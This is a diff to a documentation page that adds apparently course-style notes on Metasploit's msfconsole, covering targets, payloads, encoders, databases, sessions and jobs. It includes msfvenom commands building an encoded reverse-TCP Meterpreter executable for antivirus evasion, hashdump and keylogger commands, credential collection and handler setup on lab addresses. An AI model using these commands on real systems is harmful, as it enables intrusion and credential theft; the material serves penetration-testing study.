@@ -38,7 +38,7 @@
             const path_to_root = "../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-04f64a49.js";
+            window.path_to_searchindex_js = "../searchindex-fbad826e.js";
         </script>
         <!-- Start loading toc.js asap -->
         <script src="../toc-f5648287.js"></script>
@@ -357,6 +357,358 @@ run
 </tbody>
 </table>
 </div>
+<hr>
+<h2 id="targets"><a class="header" href="#targets">Targets</a></h2>
+<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version.</p>
+<h3 id="view-targets"><a class="header" href="#view-targets">View Targets</a></h3>
+<pre><code class="language-bash"># From root menu (requires exploit selected first)
+msf6 &gt; show targets
+[-] No exploit module selected.
+
+# From within an exploit module
+msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets
+</code></pre>
+<h3 id="select-a-target"><a class="header" href="#select-a-target">Select a Target</a></h3>
+<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6
+target =&gt; 6
+</code></pre>
+<h3 id="example-target-list"><a class="header" href="#example-target-list">Example Target List</a></h3>
+<pre><code>Exploit targets:
+   Id  Name
+   --  ----
+   0   Automatic
+   1   IE 7 on Windows XP SP3
+   2   IE 8 on Windows XP SP3
+   3   IE 7 on Windows Vista
+   4   IE 8 on Windows Vista
+   5   IE 8 on Windows 7
+   6   IE 9 on Windows 7
+</code></pre>
+<p><strong>Note:</strong> Setting target to <code>Automatic</code> lets msfconsole perform service detection before launching the attack.</p>
+<h3 id="target-identification"><a class="header" href="#target-identification">Target Identification</a></h3>
+<p>To identify a target correctly:</p>
+<ol>
+<li>Obtain a copy of the target binaries</li>
+<li>Use <code>msfpescan</code> to locate a suitable return address</li>
+</ol>
+<hr>
+<h2 id="payloads-detailed"><a class="header" href="#payloads-detailed">Payloads (Detailed)</a></h2>
+<p>Payloads are modules that aid the exploit module in returning a shell to the attacker.</p>
+<h3 id="payload-types"><a class="header" href="#payload-types">Payload Types</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Notation</th><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>windows/shell_bind_tcp</code></td><td>Single</td><td>No stage, self-contained payload</td></tr>
+<tr><td><code>windows/shell/bind_tcp</code></td><td>Staged</td><td>Stager (bind_tcp) + Stage (shell)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="singles"><a class="header" href="#singles">Singles</a></h3>
+<ul>
+<li>Self-contained payloads with exploit and entire shellcode</li>
+<li>More stable but larger in size</li>
+<li>Result immediately after execution</li>
+<li>Example: Adding a user or starting a process</li>
+</ul>
+<h3 id="stagers"><a class="header" href="#stagers">Stagers</a></h3>
+<ul>
+<li>Wait on attacker machine for connection</li>
+<li>Small and reliable</li>
+<li>Set up network connection between attacker and victim</li>
+<li>Examples: <code>reverse_tcp</code>, <code>reverse_https</code>, <code>bind_tcp</code></li>
+</ul>
+<h3 id="stages"><a class="header" href="#stages">Stages</a></h3>
+<ul>
+<li>Downloaded by stager modules</li>
+<li>Provide advanced features with no size limits</li>
+<li>Examples: Meterpreter, VNC Injection</li>
+</ul>
+<h3 id="list-payloads"><a class="header" href="#list-payloads">List Payloads</a></h3>
+<pre><code class="language-bash">msf6 &gt; show payloads
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads
+</code></pre>
+<h3 id="select-payload"><a class="header" href="#select-payload">Select Payload</a></h3>
+<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15
+# or
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
+</code></pre>
+<h3 id="common-windows-payloads"><a class="header" href="#common-windows-payloads">Common Windows Payloads</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Payload</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>generic/shell_bind_tcp</code></td><td>Generic listener, normal shell, TCP bind</td></tr>
+<tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic listener, normal shell, reverse TCP</td></tr>
+<tr><td><code>windows/x64/exec</code></td><td>Executes an arbitrary command</td></tr>
+<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal shell, single payload, reverse TCP</td></tr>
+<tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal shell, stager + stage, reverse TCP</td></tr>
+<tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + varieties</td></tr>
+<tr><td><code>windows/x64/powershell/$</code></td><td>Interactive PowerShell sessions</td></tr>
+<tr><td><code>windows/x64/vncinject/$</code></td><td>VNC Server (Reflective Injection)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="meterpreter-commands"><a class="header" href="#meterpreter-commands">Meterpreter Commands</a></h3>
+<pre><code class="language-bash">meterpreter &gt; help           # Show all commands
+meterpreter &gt; getuid         # Get current user
+meterpreter &gt; sysinfo        # System information
+meterpreter &gt; shell          # Drop to system shell
+meterpreter &gt; hashdump       # Dump SAM database
+meterpreter &gt; screenshot     # Capture screenshot
+meterpreter &gt; keyscan_start  # Start keylogger
+meterpreter &gt; background     # Background session
+</code></pre>
+<hr>
+<h2 id="encoders"><a class="header" href="#encoders">Encoders</a></h2>
+<p>Encoders change payloads to run on different architectures and help with AV evasion.</p>
+<h3 id="supported-architectures"><a class="header" href="#supported-architectures">Supported Architectures</a></h3>
+<ul>
+<li>x64, x86, sparc, ppc, mips</li>
+</ul>
+<h3 id="list-encoders"><a class="header" href="#list-encoders">List Encoders</a></h3>
+<pre><code class="language-bash">msf6 &gt; show encoders
+</code></pre>
+<h3 id="common-encoders"><a class="header" href="#common-encoders">Common Encoders</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Encoder</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>x86/shikata_ga_nai</code></td><td>Polymorphic XOR Additive Feedback Encoder</td></tr>
+<tr><td><code>x64/xor</code></td><td>XOR Encoder</td></tr>
+<tr><td><code>x64/zutto_dekiru</code></td><td>Zutto Dekiru</td></tr>
+<tr><td><code>x86/alpha_mixed</code></td><td>Alpha2 Alphanumeric Mixedcase Encoder</td></tr>
+<tr><td><code>x86/unicode_mixed</code></td><td>Alpha2 Alphanumeric Unicode Mixedcase Encoder</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="generate-encoded-payload-with-msfvenom"><a class="header" href="#generate-encoded-payload-with-msfvenom">Generate Encoded Payload with msfvenom</a></h3>
+<pre><code class="language-bash"># Single iteration
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe
+
+# Multiple iterations (10)
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
+</code></pre>
+<h3 id="check-payload-with-virustotal"><a class="header" href="#check-payload-with-virustotal">Check Payload with VirusTotal</a></h3>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f payload.exe
+</code></pre>
+<p><strong>Note:</strong> Modern AV/IPS solutions can detect encoded payloads. Multiple encoding iterations alone are often not sufficient for evasion.</p>
+<hr>
+<h2 id="databases"><a class="header" href="#databases">Databases</a></h2>
+<p>Databases in msfconsole track results, credentials, and scan data using PostgreSQL.</p>
+<h3 id="database-setup"><a class="header" href="#database-setup">Database Setup</a></h3>
+<pre><code class="language-bash"># Check PostgreSQL status
+sudo service postgresql status
+
+# Start PostgreSQL
+sudo systemctl start postgresql
+
+# Initialize MSF database
+sudo msfdb init
+
+# Check database status
+sudo msfdb status
+</code></pre>
+<h3 id="connect-to-database"><a class="header" href="#connect-to-database">Connect to Database</a></h3>
+<pre><code class="language-bash">msf6 &gt; db_status
+[*] Connected to msf. Connection type: postgresql.
+</code></pre>
+<h3 id="reinitialize-database"><a class="header" href="#reinitialize-database">Reinitialize Database</a></h3>
+<pre><code class="language-bash">msf6 &gt; msfdb reinit
+</code></pre>
+<h3 id="workspaces"><a class="header" href="#workspaces">Workspaces</a></h3>
+<pre><code class="language-bash">msf6 &gt; workspace                    # List workspaces
+msf6 &gt; workspace -a Target_1        # Add workspace
+msf6 &gt; workspace Target_1           # Switch workspace
+msf6 &gt; workspace -d Target_1        # Delete workspace
+msf6 &gt; workspace -r old new         # Rename workspace
+</code></pre>
+<h3 id="import-scan-results"><a class="header" href="#import-scan-results">Import Scan Results</a></h3>
+<pre><code class="language-bash">msf6 &gt; db_import Target.xml         # Import Nmap XML
+</code></pre>
+<h3 id="run-nmap-from-msfconsole"><a class="header" href="#run-nmap-from-msfconsole">Run Nmap from MSFconsole</a></h3>
+<pre><code class="language-bash">msf6 &gt; db_nmap -sV -sS 10.10.10.8
+</code></pre>
+<h3 id="view-stored-data"><a class="header" href="#view-stored-data">View Stored Data</a></h3>
+<pre><code class="language-bash">msf6 &gt; hosts                        # List discovered hosts
+msf6 &gt; services                     # List discovered services
+msf6 &gt; services -p 445              # Filter by port
+msf6 &gt; services -s smb              # Filter by service name
+msf6 &gt; vulns                        # List vulnerabilities
+msf6 &gt; creds                        # List credentials
+msf6 &gt; loot                         # List loot (hashes, etc.)
+</code></pre>
+<h3 id="hosts-command-options"><a class="header" href="#hosts-command-options">Hosts Command Options</a></h3>
+<pre><code class="language-bash">msf6 &gt; hosts -h
+  -a,--add         Add hosts
+  -d,--delete      Delete hosts
+  -c &lt;col1,col2&gt;   Only show specific columns
+  -R,--rhosts      Set RHOSTS from results
+  -S,--search      Search string to filter
+</code></pre>
+<h3 id="services-command-options"><a class="header" href="#services-command-options">Services Command Options</a></h3>
+<pre><code class="language-bash">msf6 &gt; services -h
+  -p &lt;port&gt;        Search by port
+  -r &lt;protocol&gt;    Protocol (tcp/udp)
+  -s &lt;name&gt;        Service name
+  -u,--up          Only show up services
+  -R,--rhosts      Set RHOSTS from results
+</code></pre>
+<h3 id="credentials-management"><a class="header" href="#credentials-management">Credentials Management</a></h3>
+<pre><code class="language-bash"># Add credentials
+msf6 &gt; creds add user:admin password:notpassword realm:workgroup
+msf6 &gt; creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
+msf6 &gt; creds add user:sshadmin ssh-key:/path/to/id_rsa
+
+# Filter credentials
+msf6 &gt; creds -u admin              # By username
+msf6 &gt; creds -p 22                 # By port
+msf6 &gt; creds -t ntlm               # By type
+</code></pre>
+<h3 id="export-data"><a class="header" href="#export-data">Export Data</a></h3>
+<pre><code class="language-bash">msf6 &gt; services -o services.csv    # Export to CSV
+msf6 &gt; creds -o creds.csv          # Export credentials
+</code></pre>
+<hr>
+<h2 id="sessions"><a class="header" href="#sessions">Sessions</a></h2>
+<p>MSFconsole can manage multiple modules simultaneously using Sessions, which create dedicated control interfaces for all deployed modules.</p>
+<h3 id="background-a-session"><a class="header" href="#background-a-session">Background a Session</a></h3>
+<pre><code class="language-bash"># From Meterpreter - press [CTRL] + [Z] or type:
+meterpreter &gt; background
+
+# Session will continue running in background
+</code></pre>
+<h3 id="list-active-sessions"><a class="header" href="#list-active-sessions">List Active Sessions</a></h3>
+<pre><code class="language-bash">msf6 &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501
+</code></pre>
+<h3 id="interact-with-a-session"><a class="header" href="#interact-with-a-session">Interact with a Session</a></h3>
+<pre><code class="language-bash">msf6 &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt;
+</code></pre>
+<h3 id="session-commands"><a class="header" href="#session-commands">Session Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>sessions</code></td><td>List all active sessions</td></tr>
+<tr><td><code>sessions -i &lt;id&gt;</code></td><td>Interact with session</td></tr>
+<tr><td><code>sessions -k &lt;id&gt;</code></td><td>Kill session</td></tr>
+<tr><td><code>sessions -K</code></td><td>Kill all sessions</td></tr>
+<tr><td><code>sessions -u &lt;id&gt;</code></td><td>Upgrade shell to Meterpreter</td></tr>
+<tr><td><code>background</code></td><td>Background current session</td></tr>
+<tr><td><code>[CTRL] + [Z]</code></td><td>Background current session</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="using-sessions-with-post-modules"><a class="header" href="#using-sessions-with-post-modules">Using Sessions with Post Modules</a></h3>
+<p>Post-exploitation modules can target existing sessions:</p>
+<pre><code class="language-bash"># Background current session
+meterpreter &gt; background
+
+# Select post module
+msf6 &gt; use post/windows/gather/credentials/credential_collector
+
+# Set the session to run against
+msf6 post(windows/gather/credentials/credential_collector) &gt; set SESSION 1
+
+# Run the module
+msf6 post(windows/gather/credentials/credential_collector) &gt; run
+</code></pre>
+<hr>
+<h2 id="jobs"><a class="header" href="#jobs">Jobs</a></h2>
+<p>Jobs allow running tasks in the background, freeing up the console for other work. This is useful when you need a port for a different module or want to run multiple handlers.</p>
+<h3 id="view-jobs-help"><a class="header" href="#view-jobs-help">View Jobs Help</a></h3>
+<pre><code class="language-bash">msf6 &gt; jobs -h
+
+OPTIONS:
+    -K        Terminate all running jobs.
+    -P        Persist all running jobs on restart.
+    -S &lt;opt&gt;  Row search filter.
+    -h        Help banner.
+    -i &lt;opt&gt;  Lists detailed information about a running job.
+    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
+    -l        List all running jobs.
+    -p &lt;opt&gt;  Add persistence to job by job ID
+    -v        Print more detailed info.
+</code></pre>
+<h3 id="run-exploit-as-background-job"><a class="header" href="#run-exploit-as-background-job">Run Exploit as Background Job</a></h3>
+<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -j
+
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.10.14.34:4444
+</code></pre>
+<h3 id="exploit-command-options"><a class="header" href="#exploit-command-options">Exploit Command Options</a></h3>
+<pre><code class="language-bash">msf6 &gt; exploit -h
+
+OPTIONS:
+    -J        Force running in the foreground, even if passive.
+    -e &lt;opt&gt;  The payload encoder to use.
+    -f        Force the exploit to run regardless of MinimumRank.
+    -j        Run in the context of a job.
+    -z        Do not interact with the session after successful exploitation.
+</code></pre>
+<h3 id="job-management-commands"><a class="header" href="#job-management-commands">Job Management Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>jobs -l</code></td><td>List all running jobs</td></tr>
+<tr><td><code>jobs -i &lt;id&gt;</code></td><td>Detailed info about job</td></tr>
+<tr><td><code>jobs -k &lt;id&gt;</code></td><td>Kill job by ID</td></tr>
+<tr><td><code>jobs -K</code></td><td>Kill all jobs</td></tr>
+<tr><td><code>kill &lt;id&gt;</code></td><td>Kill job by index number</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="example-running-multiple-handlers"><a class="header" href="#example-running-multiple-handlers">Example: Running Multiple Handlers</a></h3>
+<pre><code class="language-bash"># Start first handler as job
+msf6 exploit(multi/handler) &gt; set LPORT 4444
+msf6 exploit(multi/handler) &gt; exploit -j
+
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.10.14.34:4444
+
+# Start second handler on different port
+msf6 exploit(multi/handler) &gt; set LPORT 4445
+msf6 exploit(multi/handler) &gt; exploit -j
+
+[*] Exploit running as background job 1.
+[*] Started reverse TCP handler on 10.10.14.34:4445
+
+# List running jobs
+msf6 &gt; jobs -l
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4445
+</code></pre>
+<p><strong>Note:</strong> Don’t use <code>[CTRL] + [C]</code> to stop an exploit using a port - the port will remain in use. Use <code>jobs -k &lt;id&gt;</code> instead to properly free the port.</p>
 
                     </main>
 
